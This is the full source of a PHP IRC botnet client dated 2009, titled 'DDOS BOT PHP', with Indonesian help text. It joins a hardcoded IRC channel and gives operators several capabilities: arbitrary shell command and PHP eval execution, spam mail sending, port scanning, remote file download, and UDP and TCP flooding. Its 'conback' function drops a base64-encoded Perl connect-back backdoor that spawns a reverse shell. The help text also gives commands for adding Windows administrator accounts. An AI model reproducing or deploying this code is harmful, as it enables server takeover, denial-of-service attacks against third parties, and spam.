<?
######################################################
## DDOS BOT PHP Recod By stealth ##
## Dont Forget to Visit http://makam.us/ ##
## © April 2009 MaNIaX ##
######################################################

set_time_limit(0);
error_reporting(0);
echo "ok!";
######################################################
class pBot
{
var $config = array("server"=>"irc.indoirc.info",
"port"=>"6667",
"pass"=>"q",
"prefix"=>"CeweK",
"maxrand"=>"5",
"chan"=>"#indoirc",
"chan2"=>"#indoirc",
"key"=>"seph",
"modes"=>"+p",
"password"=>"q",
"trigger"=>".",
"hostauth"=>"*"
);
var $users = array();
function start()
{
if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))
$this->start();
$ident = $this->config['prefix'];
$alph = range("0","9");
for($i=0;$i<$this->config['maxrand'];$i++)
$ident .= $alph[rand(0,9)];
if(strlen($this->config['pass'])>0)
$this->send("PASS ".$this->config['pass']);
$this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
$this->set_nick();
$this->main();
}
######################################################
function main()
{
while(!feof($this->conn))
{
$this->buf = trim(fgets($this->conn,512));
$cmd = explode(" ",$this->buf);
if(substr($this->buf,0,6)=="PING :")
{
$this->send("PONG :".substr($this->buf,6));
}
if(isset($cmd[1]) && $cmd[1] =="001")
{
$this->send("MODE ".$this->nick." ".$this->config['modes']);
$this->join($this->config['chan'],$this->config['key']);
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "ON"; }
else { $safemode = "OFF"; }
$uname = php_uname();
}
if(isset($cmd[1]) && $cmd[1]=="433")
{
$this->set_nick();
}
if($this->buf != $old_buf)
{
$mcmd = array();
$msg = substr(strstr($this->buf," :"),2);
$msgcmd = explode(" ",$msg);
$nick = explode("!",$cmd[0]);
$vhost = explode("@",$nick[1]);
$vhost = $vhost[1];
$nick = substr($nick[0],1);
$host = $cmd[0];
if($msgcmd[0]==$this->nick)
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i+1];
}
else
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i];
}
if(count($cmd)>2)
{
switch($cmd[1])
{
case "QUIT":
if($this->is_logged_in($host))
{
$this->log_out($host);
}
break;
#########################################################################
case "PART":
if($this->is_logged_in($host))
{
$this->log_out($host);
}
break;
#########################################################################
case "PRIVMSG":
if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))
{
if(substr($mcmd[0],0,1)==".")
{
switch(substr($mcmd[0],1))
{
case "login":
if($mcmd[1]==$this->config['password'])
{
$this->privmsg($this->config['chan'],"siap komandan $nick !!");
$this->log_in($host);
}
else
{
$this->privmsg($this->config['chan'],"FUCK YOU $nick ");
}
break;
}
}
}
elseif($this->is_logged_in($host))
{
if(substr($mcmd[0],0,1)==".")
{
switch(substr($mcmd[0],1))
{
case "reonline":
$this->send("QUIT : Reonline By $nick");
fclose($this->conn);
$this->start();
break;
#########################################################################
case "sendmail": //mail to from subject message
if(count($mcmd)>4)
{
$header = "From: <".$mcmd[2].">";
if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Unable to Send E-mail.");
}
else
{
$this->privmsg($this->config['chan'],"[\2mail\2]: Mail Send to \2".$mcmd[1]."\2");
}
}
break;
#########################################################################
case "safe":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
$safemode = "on";
}
else {
$safemode = "off";
}
$this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
break;
#########################################################################
case "inbox": //teste inbox
if(isset($mcmd[1]))
{
$token = md5(uniqid(rand(), true));
$header = "From: <inbox".$token."@jatimcom.us>";
$a = php_uname();
$b = getenv("SERVER_SOFTWARE");
$c = gethostbyname($_SERVER["HTTP_HOST"]);
if(!mail($mcmd[1],"InBox Test","#jatimcom since 2009\n\nip: $c \nsoftware: $b \nsystem: $a \nvuln: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\n\ngreetz: Vuln\nby: dvl <admin@jatimcom.us>",$header))
{
$this->privmsg($this->config['chan'],"[\2inbox\2]: Unable to send");
}
else
{
$this->privmsg($this->config['chan'],"[\2inbox\2]: Message sent to \2".$mcmd[1]."\2");
}
}
break;
#########################################################################
case "conback":
if(count($mcmd)>2)
{
$this->conback($mcmd[1],$mcmd[2]);
}
break;
#########################################################################
case "dns":
if(isset($mcmd[1]))
{
$ip = explode(".",$mcmd[1]);
if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
{
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
}
else
{
$this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
}
}
break;
#########################################################################
case "info":
case "vunl":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->notice($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
$this->notice($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
$this->notice($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
$this->notice($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
$this->notice($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
break;
#########################################################################
case "myinfo":
case "vunl":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"Dont Forget To Cek http://jatimcom.uni.cc/");
$this->privmsg($this->config['chan'],"$uname (safe: $safemode)");
$this->privmsg($this->config['chan'],"http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
break;
#########################################################################
case "bot":
$this->privmsg($this->config['chan'],"PHPBOT 1.0 By stealth.");
break;
#########################################################################
case "uname":
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
else { $safemode = "off"; }
$uname = php_uname();
$this->privmsg($this->config['chan'],"$uname (safe: $safemode)");
break;
#########################################################################
case "rndnick":
$this->set_nick();
break;
#########################################################################
case "raw":
$this->send(strstr($msg,$mcmd[1]));
break;
#########################################################################
case "eval":
$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
break;
#########################################################################
case "sexec":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = shell_exec($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
#########################################################################
case "exec":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = exec($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
#########################################################################
case "passthru":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = passthru($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
#########################################################################
case "popen":
if(isset($mcmd[1]))
{
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$this->privmsg($this->config['chan'],"$command");
$pipe = popen($command,"r");
while(!feof($pipe))
{
$pbuf = trim(fgets($pipe,512));
if($pbuf != NULL)
$this->privmsg($this->config['chan']," : $pbuf");
}
pclose($pipe);
}
#########################################################################
case "system":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = system($command);
$ret = explode("\n",$exec);
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
#########################################################################
case "pscan": // .pscan 127.0.0.1 6667
if(count($mcmd) > 2)
{
if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))
$this->privmsg($this->config['chan'],"".$mcmd[1].":".$mcmd[2]." is \2open\2");
else
$this->privmsg($this->config['chan'],"".$mcmd[1].":".$mcmd[2]." is \2closed\2");
}
break;
#########################################################################
case "download":
if(count($mcmd) > 2)
{
if(!$fp = fopen($mcmd[2],"w"))
{
$this->privmsg($this->config['chan'],"Could not download. Permission denied");
}
else
{
if(!$get = file($mcmd[1]))
{
$this->privmsg($this->config['chan'],"Could not download \2".$mcmd[1]."\2");
}
else
{
for($i=0;$i<=count($get);$i++)
{
fwrite($fp,$get[$i]);
}
$this->privmsg($this->config['chan'],"File \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2");
}
fclose($fp);
}
}
else { $this->privmsg($this->config['chan'],"use download http://your.host/file /tmp/file"); }
break;
#########################################################################
case "help":
$this->privmsg($this->config['chan'],"15[ 7BOT COMMANDS 15] 08");
$this->privmsg($this->config['chan'],".login");
$this->privmsg($this->config['chan'],".uname untuk info Operating system");
$this->privmsg($this->config['chan'],".exec <cmd> untuk perintah yang berjalan pada sistem OS bot");
$this->privmsg($this->config['chan'],".sexec <cmd> untuk perintah yang berjalan pada sistem OS bot");
$this->privmsg($this->config['chan'],".cmd <cmd> untuk perintah yang berjalan pada sistem OS bot");
$this->privmsg($this->config['chan'],".raw <cmd> untuk menjalankan perintah2 di irc");
$this->privmsg($this->config['chan'],".sendmail <to> <from> <subject> <msg> untuk kirim email");
$this->privmsg($this->config['chan'],".restart untuk restart bot");
$this->privmsg($this->config['chan'],".dead untuk kill me");
$this->privmsg($this->config['chan'],".udpflood <target> <packets> <packetsize> <delay> untuk flood udp suatu jaringan");
$this->privmsg($this->config['chan'],".tcpflood <target> <packets> <packetsize> <port> <delay> untuk flood port jaringan");
$this->privmsg($this->config['chan'],".pscan <host> <port> untuk scan port");
$this->privmsg($this->config['chan'],".dns <hostname> untuk looking dns");
$this->privmsg($this->config['chan'],".download <URL> <filename> untuk download file");
$this->privmsg($this->config['chan'],".conback untuk membuat back ke host");
$this->privmsg($this->config['chan'],".rndnick untuk ganti nick bot");
$this->privmsg($this->config['chan'],".logout");
$this->privmsg($this->config['chan'],"15[ 7RDP COMMANDS FOR WINDOWServ Only 15] 08");
$this->privmsg($this->config['chan'],".sexec <hostname> untuk melihat host");
$this->privmsg($this->config['chan'],".sexec <net user> untuk melihat user list");
$this->privmsg($this->config['chan'],".sexec <net user name password /add> untuk menambah user acount");
$this->privmsg($this->config['chan'],".sexec <net localgroup administrators Useracount /add> untuk menambahkan user ke localgroup administrators");
$this->privmsg($this->config['chan'],".sexec <net user username /delete> untuk menghapus user acount");
$this->privmsg($this->config['chan'],".sexec <ipconfig or ipconfig/all> untuk melihat ip computer");
$this->privmsg($this->config['chan'],"Copyright stealth April 2009");
$this->privmsg($this->config['chan'],"Selamat mencoba ^_^");
break;
#########################################################################
case "dead":
$this->send("QUIT :Quit And Not Back, Command From $nick");
fclose($this->conn);
exit;
case "logout":
$this->log_out($host);
$this->privmsg($this->config['chan'],"[\2auth\2]: $nick Logout!");
break;
#########################################################################
case "udpflood":
if(count($mcmd)>3)
{
$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);
}
break;
#########################################################################
case "tcpflood":
if(count($mcmd)>5)
{
$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);
}
break;
}
}
}
break;
}
}
}
$old_buf = $this->buf;
}
$this->start();
}
function send($msg)
{
fwrite($this->conn,"$msg\r\n");

}
function join($chan,$key=NULL)
{
$this->send("JOIN $chan $key");
}
function privmsg($to,$msg)
{
$this->send("PRIVMSG $to :$msg");
}
function notice($to,$msg)
{
$this->send("NOTICE $to :$msg");
}
function is_logged_in($host)
{
if(isset($this->users[$host]))
return 1;
else
return 0;
}
function log_in($host)
{
$this->users[$host] = true;
}
function log_out($host)
{
unset($this->users[$host]);
}
function set_nick()
{
if(isset($_SERVER['SERVER_SOFTWARE']))
{
if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache"))
$this->nick = "";
elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis"))
$this->nick = "";
elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami"))
$this->nick = "";
else
$this->nick = "";
}
else
{
$this->nick = "";
}
$this->nick .= $this->config['prefix'];
for($i=0;$i<$this->config['maxrand'];$i++)
$this->nick .= mt_rand(0,9);
$this->send("NICK ".$this->nick);
}
#########################################################################
function udpflood($host,$packetsize,$time) {
$this->privmsg($this->config['chan'],"[\2Lock Target!\2]");
$packet = "";
for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
$timei = time();
$i = 0;
while(time()-$timei < $time) {
$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
fwrite($fp,$packet);
fclose($fp);
$i++;
}
$env = $i * $packetsize;
$env = $env / 1048576;
$vel = $env / $time;
$vel = round($vel);
$env = round($env);
$this->privmsg($this->config['chan'],"[\2Packet Finish!\2]: $env MB Send / Media: $vel MB/s ");
}
#########################################################################
function tcpflood($host,$packets,$packetsize,$port,$delay)
{
$this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]");
$packet = "";
for($i=0;$i<$packetsize;$i++)
$packet .= chr(mt_rand(1,256));
for($i=0;$i<$packets;$i++)
{
if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5))
{
$this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>");
return 0;
}
else
{
fwrite($fp,$packet);
fclose($fp);
}
sleep($delay);
}
$this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets packages for $host:$port.");
}
#########################################################################
function conback($ip,$port)
{
$this->privmsg($this->config['chan'],"[\2conback\2]: trying connecting to $ip:$port");
$dc_source = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypminggatR1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==";
if (is_writable("/tmp"))
{
if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }
$fp=fopen("/tmp/dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl /tmp/dc.pl $ip $port &");
unlink("/tmp/dc.pl");
}
else
{
if (is_writable("/var/tmp"))
{
if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }
$fp=fopen("/var/tmp/dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl /var/tmp/dc.pl $ip $port &");
unlink("/var/tmp/dc.pl");
}
if (is_writable("."))
{
if (file_exists("dc.pl")) { unlink("dc.pl"); }
$fp=fopen("dc.pl","w");
fwrite($fp,base64_decode($dc_source));
passthru("perl dc.pl $ip $port &");
unlink("dc.pl");
}
}
}
}
#########################################################################
$bot = new pBot;
$bot->start();
##############
##[ MaNIaX ]##
##############
?>
